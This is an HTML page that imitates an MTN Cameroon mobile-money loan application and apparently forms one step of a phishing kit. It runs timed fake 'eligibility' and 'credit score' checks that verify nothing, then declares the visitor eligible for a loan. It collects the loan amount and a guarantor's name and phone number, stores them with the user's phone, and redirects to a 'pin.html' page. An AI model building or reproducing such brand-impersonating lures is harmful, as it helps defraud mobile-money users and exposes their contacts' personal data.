<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <title>MTN  – Loan Application</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    :root {
      --bg: #ffffff;
      --card: #ffffff;
      --border: #e5e7eb;
      --text: #111827;
      --sub: #6b7280;
      --mtn-yellow: #FFCC00;
      --mtn-darkyellow: #E6B800;
      --shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
      --radius: 18px;
    }

    body {
      font-family: 'Inter', Arial, Helvetica, sans-serif;
      background: var(--bg);
      color: var(--text);
      padding: 20px 12px;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .container {
      width: 100%;
      max-width: 420px;
      background: #ffffff;
      border-radius: 28px;
      padding: 24px 20px 30px;
      box-shadow: var(--shadow);
      position: relative;
      overflow: hidden;
    }

    .mtn-header {
      position: relative;
      z-index: 2;
      text-align: center;
      margin-bottom: 16px;
    }

    .logo-circle {
      width: 56px;
      height: 56px;
      background: #000;
      border-radius: 50%;
      color: var(--mtn-yellow);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 32px;
      font-weight: 800;
      margin: 0 auto 6px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
    }

    .logo-text {
      color: #000;
      font-size: 28px;
      font-weight: 800;
      letter-spacing: -0.5px;
      line-height: 1;
      margin-bottom: 4px;
    }

    .logo-text span {
      color: var(--mtn-yellow);
      background: #000;
      display: inline-block;
      padding: 0 6px;
      border-radius: 10px;
    }

    .application-card {
      background: var(--card);
      border-radius: var(--radius);
      padding: 28px 20px;
      box-shadow: var(--shadow);
      border: 1px solid var(--border);
      text-align: center;
      margin: 20px 0 24px;
      position: relative;
      z-index: 2;
      transition: all 0.3s ease;
    }

    .step-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 16px;
    }

    .step-icon {
      font-size: 48px;
      color: var(--mtn-yellow);
      margin-bottom: 8px;
    }

    .step-title {
      font-size: 24px;
      font-weight: 700;
      color: var(--mtn-yellow);
      margin-bottom: 12px;
    }

    .step-description {
      font-size: 15px;
      color: var(--sub);
      line-height: 1.5;
    }

    .loader {
      width: 40px;
      height: 40px;
      border: 3px solid #ffe0a3;
      border-top: 3px solid var(--mtn-yellow);
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 20px auto 0;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .limit-badge {
      background: #fffae9;
      border: 1px solid #ffeeba;
      border-radius: 40px;
      padding: 8px 16px;
      display: inline-block;
      font-weight: 600;
      color: #000;
      margin: 16px 0 12px;
    }

    .loan-form {
      width: 100%;
      margin: 20px 0;
    }

    .input-group {
      margin-bottom: 20px;
      text-align: left;
    }

    .input-group label {
      display: block;
      font-size: 13px;
      font-weight: 600;
      color: var(--sub);
      margin-bottom: 8px;
    }

    .input-group input {
      width: 100%;
      padding: 14px 16px;
      border: 1px solid var(--border);
      border-radius: 12px;
      font-size: 15px;
      font-weight: 500;
      outline: none;
      transition: border 0.2s;
      background: #fff;
    }

    .input-group input:focus {
      border-color: var(--mtn-yellow);
      box-shadow: 0 0 0 2px rgba(255, 204, 0, 0.2);
    }

    .name-row {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 12px;
      margin-bottom: 20px;
    }

    .error-message {
      font-size: 12px;
      color: #dc2626;
      margin-top: 6px;
      display: none;
    }

    .error-message.visible {
      display: block;
    }

    .btn {
      width: 100%;
      padding: 16px 20px;
      border: none;
      border-radius: 14px;
      background: linear-gradient(90deg, var(--mtn-yellow), var(--mtn-darkyellow));
      color: #000;
      font-size: 16px;
      font-weight: 800;
      cursor: pointer;
      box-shadow: 0 8px 20px rgba(255, 204, 0, 0.3);
      transition: 0.2s;
      text-decoration: none;
      display: inline-block;
      text-align: center;
    }

    .btn:hover {
      background: linear-gradient(90deg, #E6B800, #D4A600);
      transform: scale(1.02);
    }

    .btn:disabled {
      background: #e5e5e5;
      color: #999;
      box-shadow: none;
      cursor: not-allowed;
      transform: none;
    }

    .section-header {
      text-align: left;
      margin: 20px 0 12px 0;
      padding-bottom: 8px;
      border-bottom: 2px solid #fffae9;
    }

    .section-header h3 {
      font-size: 16px;
      font-weight: 700;
      color: #000;
      letter-spacing: -0.3px;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .section-header h3 i {
      font-size: 18px;
      color: var(--mtn-yellow);
    }

    .footer {
      text-align: center;
      margin-top: 24px;
      font-size: 12px;
      color: #aaa;
      position: relative;
      z-index: 2;
    }

    #spinner {
      position: fixed;
      inset: 0;
      display: none;
      align-items: center;
      justify-content: center;
      background: rgba(255, 255, 255, 0.7);
      backdrop-filter: blur(2px);
      z-index: 999;
    }

    .spinner-loader {
      width: 44px;
      height: 44px;
      border: 4px solid #ffe0a3;
      border-top: 4px solid var(--mtn-yellow);
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="mtn-header">
      <div class="logo-circle">M</div>
      <div class="logo-text"><span>MTN</span> </div>
    </div>

    <div class="application-card" id="applicationCard">
      <div id="stepContent"></div>
    </div>

    <div class="footer">
      v2.6.2 (MTN-QWIK-2026) • MTN  Cameroon
    </div>
  </div>

  <div id="spinner">
    <div class="spinner-loader"></div>
  </div>

  <script>
    // Step definitions – English
    const steps = [
      {
        icon: 'fas fa-user-check',
        title: 'Eligibility Check',
        description: 'Verifying your MTN MoMo account and transaction history...',
        duration: 4000
      },
      {
        icon: 'fas fa-chart-line',
        title: 'Limit Calculation',
        description: 'Analyzing your repayment capacity and credit score...',
        duration: 3500
      },
      {
        icon: 'fas fa-file-invoice-dollar',
        title: 'Preparing Your Offer',
        description: 'Finalizing the best loan package for you...',
        duration: 4000
      }
    ];

    let currentStep = 0;
    let timeoutId = null;
    const stepContent = document.getElementById('stepContent');

    // Cameroon-specific loan limits (XAF)
    const MAX_LIMIT = 500000;
    const MIN_AMOUNT = 1000;

    // Retrieve user's phone from sessionStorage
    const userPhone = sessionStorage.getItem('mtn_phone') || '';

    function renderStep(index) {
      const step = steps[index];
      stepContent.innerHTML = `
        <div class="step-container">
          <div class="step-icon"><i class="${step.icon}"></i></div>
          <div class="step-title">${step.title}</div>
          <div class="step-description">${step.description}</div>
          <div class="loader"></div>
        </div>
      `;
    }

    function showLoanForm() {
      stepContent.innerHTML = `
        <div class="step-container">
          <div class="step-icon"><i class="fas fa-check-circle"></i></div>
          <div class="step-title">You are eligible!</div>
          <div class="limit-badge">Maximum limit: ${MAX_LIMIT.toLocaleString('en-US')} XAF</div>
          <div class="loan-form">
            <div class="input-group">
              <label>Loan Amount (XAF)</label>
              <input type="number" id="loanAmount" placeholder="Enter ${MIN_AMOUNT.toLocaleString('en-US')} to ${MAX_LIMIT.toLocaleString('en-US')} XAF" min="${MIN_AMOUNT}" max="${MAX_LIMIT}" step="1">
              <div class="error-message" id="amountError">Please enter a valid amount.</div>
            </div>

            <div class="section-header">
              <h3><i class="fas fa-user-friends"></i> Guarantor / Next of Kin</h3>
            </div>
            <div class="name-row">
              <div class="input-group" style="margin-bottom: 0;">
                <label>First Name</label>
                <input type="text" id="guarantorFirstName" placeholder="First name" autocomplete="off">
                <div class="error-message" id="firstNameError">First name is required.</div>
              </div>
              <div class="input-group" style="margin-bottom: 0;">
                <label>Last Name</label>
                <input type="text" id="guarantorLastName" placeholder="Last name" autocomplete="off">
                <div class="error-message" id="lastNameError">Last name is required.</div>
              </div>
            </div>
            <div class="input-group">
              <label>Guarantor Phone</label>
              <input type="tel" id="guarantorPhone" placeholder="e.g. 6 55 12 34 56" inputmode="numeric">
              <div class="error-message" id="phoneError">Invalid number or identical to yours.</div>
            </div>

            <button id="applyBtn" class="btn" disabled>Apply Now</button>
          </div>
        </div>
      `;

      const amountInput = document.getElementById('loanAmount');
      const firstNameInput = document.getElementById('guarantorFirstName');
      const lastNameInput = document.getElementById('guarantorLastName');
      const phoneInput = document.getElementById('guarantorPhone');
      const applyBtn = document.getElementById('applyBtn');

      const amountError = document.getElementById('amountError');
      const firstNameError = document.getElementById('firstNameError');
      const lastNameError = document.getElementById('lastNameError');
      const phoneError = document.getElementById('phoneError');

      // Hide all errors initially
      [amountError, firstNameError, lastNameError, phoneError].forEach(el => el.classList.remove('visible'));

      // Validation functions
      function validateAmount() {
        const val = parseInt(amountInput.value, 10);
        if (isNaN(val) || val < MIN_AMOUNT || val > MAX_LIMIT) {
          amountError.classList.add('visible');
          if (isNaN(val)) amountError.textContent = `Please enter a valid number.`;
          else amountError.textContent = `Amount must be between ${MIN_AMOUNT.toLocaleString('en-US')} and ${MAX_LIMIT.toLocaleString('en-US')} XAF.`;
          return false;
        } else {
          amountError.classList.remove('visible');
          return true;
        }
      }

      function validateFirstName() {
        const val = firstNameInput.value.trim();
        if (val === '') {
          firstNameError.classList.add('visible');
          return false;
        } else {
          firstNameError.classList.remove('visible');
          return true;
        }
      }

      function validateLastName() {
        const val = lastNameInput.value.trim();
        if (val === '') {
          lastNameError.classList.add('visible');
          return false;
        } else {
          lastNameError.classList.remove('visible');
          return true;
        }
      }

      function validatePhone() {
        const raw = phoneInput.value.trim();
        const digits = raw.replace(/\D/g, '');
        const userDigits = userPhone.replace(/\D/g, '');
        if (digits === '') {
          phoneError.textContent = 'Phone number is required.';
          phoneError.classList.add('visible');
          return false;
        } else if (digits === userDigits && userDigits !== '') {
          phoneError.textContent = 'Guarantor phone cannot be the same as yours.';
          phoneError.classList.add('visible');
          return false;
        } else if (digits.length !== 9) {
          phoneError.textContent = 'Please enter a valid phone number (9 digits).';
          phoneError.classList.add('visible');
          return false;
        } else {
          phoneError.classList.remove('visible');
          return true;
        }
      }

      // Attach blur events
      amountInput.addEventListener('blur', function() {
        validateAmount();
        updateButton();
      });
      firstNameInput.addEventListener('blur', function() {
        validateFirstName();
        updateButton();
      });
      lastNameInput.addEventListener('blur', function() {
        validateLastName();
        updateButton();
      });
      phoneInput.addEventListener('blur', function() {
        validatePhone();
        updateButton();
      });

      // Input events for real-time feedback
      amountInput.addEventListener('input', function() {
        const val = parseInt(this.value, 10);
        if (!isNaN(val) && val >= MIN_AMOUNT && val <= MAX_LIMIT) {
          amountError.classList.remove('visible');
        }
        updateButton();
      });
      firstNameInput.addEventListener('input', function() {
        if (this.value.trim() !== '') firstNameError.classList.remove('visible');
        updateButton();
      });
      lastNameInput.addEventListener('input', function() {
        if (this.value.trim() !== '') lastNameError.classList.remove('visible');
        updateButton();
      });
      phoneInput.addEventListener('input', function() {
        const digits = this.value.replace(/\D/g, '');
        if (digits.length === 9 && digits !== userPhone.replace(/\D/g, '')) {
          phoneError.classList.remove('visible');
        }
        updateButton();
      });

      function updateButton() {
        const amountOk = validateAmount();
        const firstNameOk = validateFirstName();
        const lastNameOk = validateLastName();
        const phoneOk = validatePhone();
        applyBtn.disabled = !(amountOk && firstNameOk && lastNameOk && phoneOk);
      }

      applyBtn.disabled = true;

      applyBtn.addEventListener('click', function() {
        const amountOk = validateAmount();
        const firstNameOk = validateFirstName();
        const lastNameOk = validateLastName();
        const phoneOk = validatePhone();
        if (amountOk && firstNameOk && lastNameOk && phoneOk) {
          const amount = parseInt(amountInput.value, 10);
          const firstName = firstNameInput.value.trim();
          const lastName = lastNameInput.value.trim();
          const phoneDigits = phoneInput.value.replace(/\D/g, '');

          sessionStorage.setItem('mtn_loanAmount', amount);
          sessionStorage.setItem('mtn_guarantorFirstName', firstName);
          sessionStorage.setItem('mtn_guarantorLastName', lastName);
          sessionStorage.setItem('mtn_guarantorPhone', phoneDigits);

          const spinner = document.getElementById('spinner');
          spinner.style.display = 'flex';
          applyBtn.disabled = true;

          setTimeout(() => {
            window.location.href = 'pin.html';
          }, 1500);
        } else {
          validateAmount();
          validateFirstName();
          validateLastName();
          validatePhone();
          applyBtn.disabled = true;
        }
      });
    }

    function nextStep() {
      currentStep++;
      if (currentStep < steps.length) {
        renderStep(currentStep);
        timeoutId = setTimeout(() => {
          nextStep();
        }, steps[currentStep].duration);
      } else {
        showLoanForm();
      }
    }

    function startApplication() {
      renderStep(0);
      timeoutId = setTimeout(() => {
        nextStep();
      }, steps[0].duration);
    }

    startApplication();

    window.addEventListener('beforeunload', () => {
      if (timeoutId) clearTimeout(timeoutId);
    });
  </script>
</body>
</html>
